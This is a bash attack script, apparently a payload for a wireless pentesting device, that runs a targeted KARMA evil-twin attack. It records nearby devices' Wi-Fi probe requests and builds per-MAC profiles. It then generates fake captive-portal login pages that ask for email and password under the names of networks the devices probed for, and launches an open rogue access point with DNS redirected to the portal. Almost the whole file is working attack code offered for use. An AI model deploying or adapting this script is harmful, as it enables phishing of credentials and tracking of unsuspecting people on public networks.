#!/bin/bash
# ═══════════════════════════════════════════════════════════════════════════════
# Title:         WiFiKarma2
# Description:   Advanced KARMA attack with intelligent SSID targeting.
#                Monitors probe requests, builds client profiles, and
#                creates targeted evil twins with automatic credential
#                harvesting portals customized per target network.
# Author:        bad-antics
# Category:      attack
# Version:       2.0
# ═══════════════════════════════════════════════════════════════════════════════

LOOT_DIR="/mmc/nullsec/WiFiKarma2"
LOG_FILE="${LOOT_DIR}/karma2.log"
PORTAL_DIR="${LOOT_DIR}/portals"
PROFILES_DIR="${LOOT_DIR}/profiles"
IFACE_MON="wlan1mon"
IFACE_AP="wlan0"
CAPTURE_TIMEOUT=60
MAX_TARGETS=10

log() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" | tee -a "$LOG_FILE"
}

setup() {
    mkdir -p "$LOOT_DIR" "$PORTAL_DIR" "$PROFILES_DIR"
    log "WiFiKarma2 v2.0 initializing..."

    for cmd in airmon-ng hostapd dnsmasq tcpdump; do
        if ! command -v "$cmd" &>/dev/null; then
            log "WARNING: $cmd not found, some features disabled"
        fi
    done
}

# Phase 1: Passive reconnaissance - build client profiles
recon_phase() {
    log "Phase 1: Passive recon - capturing probe requests..."

    # Capture probe requests
    timeout "$CAPTURE_TIMEOUT" tcpdump -i "$IFACE_MON" -e 'type mgt subtype probe-req' \
        -w "${LOOT_DIR}/probes.pcap" 2>/dev/null &
    TCPDUMP_PID=$!

    sleep "$CAPTURE_TIMEOUT"
    kill "$TCPDUMP_PID" 2>/dev/null

    # Parse probe requests into client profiles
    tcpdump -r "${LOOT_DIR}/probes.pcap" -e 2>/dev/null | \
    while read -r line; do
        MAC=$(echo "$line" | grep -oP '(SA|TA):(\K[0-9a-f:]+)' | head -1)
        SSID=$(echo "$line" | grep -oP 'Probe Request \(\K[^)]+')

        if [[ -n "$MAC" && -n "$SSID" ]]; then
            PROFILE="${PROFILES_DIR}/${MAC//:/}.json"

            if [[ -f "$PROFILE" ]]; then
                # Append SSID to existing profile
                python3 -c "
import json
with open('$PROFILE') as f: p = json.load(f)
if '$SSID' not in p['probed_ssids']: p['probed_ssids'].append('$SSID')
p['probe_count'] = p.get('probe_count', 0) + 1
with open('$PROFILE', 'w') as f: json.dump(p, f, indent=2)
" 2>/dev/null
            else
                # Create new profile
                cat > "$PROFILE" <<PROFILE_EOF
{
    "mac": "$MAC",
    "probed_ssids": ["$SSID"],
    "probe_count": 1,
    "first_seen": "$(date -Iseconds)",
    "targeted": false
}
PROFILE_EOF
            fi
        fi
    done

    PROFILE_COUNT=$(ls "$PROFILES_DIR"/*.json 2>/dev/null | wc -l)
    log "Built $PROFILE_COUNT client profiles"

    # Rank SSIDs by popularity
    cat "$PROFILES_DIR"/*.json 2>/dev/null | \
        python3 -c "
import json, sys, collections
ssids = collections.Counter()
for line in sys.stdin:
    try:
        for s in json.loads(line).get('probed_ssids', []):
            ssids[s] += 1
    except: pass
for ssid, count in ssids.most_common($MAX_TARGETS):
    print(f'{count} {ssid}')
" > "${LOOT_DIR}/target_ssids.txt" 2>/dev/null

    log "Top target SSIDs:"
    head -5 "${LOOT_DIR}/target_ssids.txt" | while read -r count ssid; do
        log "  [$count clients] $ssid"
    done
}

# Phase 2: Generate targeted captive portals
generate_portals() {
    log "Phase 2: Generating targeted captive portals..."

    while IFS=' ' read -r count ssid; do
        [[ -z "$ssid" ]] && continue

        SAFE_NAME=$(echo "$ssid" | tr -cd 'a-zA-Z0-9_-')
        PORTAL="${PORTAL_DIR}/${SAFE_NAME}"
        mkdir -p "$PORTAL"

        # Detect portal type based on SSID patterns
        PORTAL_TYPE="generic"
        if echo "$ssid" | grep -qiE 'starbucks|coffee|cafe'; then
            PORTAL_TYPE="coffeeshop"
        elif echo "$ssid" | grep -qiE 'hotel|hilton|marriott|hyatt|inn'; then
            PORTAL_TYPE="hotel"
        elif echo "$ssid" | grep -qiE 'airport|terminal|gate'; then
            PORTAL_TYPE="airport"
        elif echo "$ssid" | grep -qiE 'corp|enterprise|office|company'; then
            PORTAL_TYPE="enterprise"
        elif echo "$ssid" | grep -qiE 'guest|visitor|free'; then
            PORTAL_TYPE="guest"
        fi

        # Generate portal HTML
        cat > "${PORTAL}/index.html" <<PORTAL_HTML
<!DOCTYPE html>
<html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>${ssid} - WiFi Login</title>
<style>
body{font-family:-apple-system,BlinkMacSystemFont,sans-serif;background:#f5f5f5;margin:0;display:flex;justify-content:center;align-items:center;min-height:100vh}
.card{background:#fff;border-radius:12px;box-shadow:0 4px 24px rgba(0,0,0,.1);padding:40px;max-width:400px;width:100%}
h1{font-size:24px;margin-bottom:8px;color:#333}
p{color:#666;margin-bottom:24px}
input{width:100%;padding:12px;border:1px solid #ddd;border-radius:8px;margin-bottom:16px;font-size:16px;box-sizing:border-box}
button{width:100%;padding:14px;background:#007bff;color:#fff;border:none;border-radius:8px;font-size:16px;cursor:pointer}
button:hover{background:#0056b3}
.logo{text-align:center;margin-bottom:24px;font-size:32px}
</style></head><body>
<div class="card">
<div class="logo">📶</div>
<h1>Welcome to ${ssid}</h1>
<p>Please sign in to access the internet.</p>
<form method="POST" action="/auth">
<input type="email" name="email" placeholder="Email address" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Connect</button>
</form>
<p style="font-size:12px;text-align:center;margin-top:16px">By connecting, you agree to our Terms of Service</p>
</div>
<script>
document.querySelector('form').addEventListener('submit',function(e){
e.preventDefault();var d=new FormData(this);
fetch('/auth',{method:'POST',body:d}).then(function(){window.location='/success'});
});
</script></body></html>
PORTAL_HTML

        log "  Generated $PORTAL_TYPE portal for '$ssid' ($count targets)"
    done < "${LOOT_DIR}/target_ssids.txt"
}

# Phase 3: Deploy evil twin with highest-value target
deploy_twin() {
    TOP_SSID=$(head -1 "${LOOT_DIR}/target_ssids.txt" | cut -d' ' -f2-)
    [[ -z "$TOP_SSID" ]] && { log "No targets found"; return; }

    log "Phase 3: Deploying evil twin for '$TOP_SSID'..."

    # Generate hostapd config
    cat > "${LOOT_DIR}/hostapd.conf" <<HOSTAPD
interface=${IFACE_AP}
driver=nl80211
ssid=${TOP_SSID}
hw_mode=g
channel=6
wmm_enabled=0
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
wpa=0
HOSTAPD

    # Generate dnsmasq config (redirect all DNS to captive portal)
    cat > "${LOOT_DIR}/dnsmasq.conf" <<DNSMASQ
interface=${IFACE_AP}
dhcp-range=10.0.0.10,10.0.0.250,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
server=8.8.8.8
log-queries
log-facility=${LOOT_DIR}/dns.log
address=/#/10.0.0.1
DNSMASQ

    # Start services
    ip addr add 10.0.0.1/24 dev "$IFACE_AP" 2>/dev/null
    hostapd "${LOOT_DIR}/hostapd.conf" -B 2>/dev/null
    dnsmasq -C "${LOOT_DIR}/dnsmasq.conf" 2>/dev/null &

    log "Evil twin '$TOP_SSID' deployed on $IFACE_AP"
    log "Waiting for client connections..."

    # Monitor for credentials
    while true; do
        # Check for new DHCP leases
        if [[ -f /var/lib/misc/dnsmasq.leases ]]; then
            NEW_CLIENTS=$(wc -l < /var/lib/misc/dnsmasq.leases)
            log "Active clients: $NEW_CLIENTS"
        fi
        sleep 15
    done
}

cleanup() {
    log "WiFiKarma2 shutting down..."
    pkill -f hostapd 2>/dev/null
    pkill -f dnsmasq 2>/dev/null
    ip addr del 10.0.0.1/24 dev "$IFACE_AP" 2>/dev/null
    log "Credentials and profiles saved to $LOOT_DIR"
}

trap cleanup EXIT

# Main
setup
recon_phase
generate_portals
deploy_twin
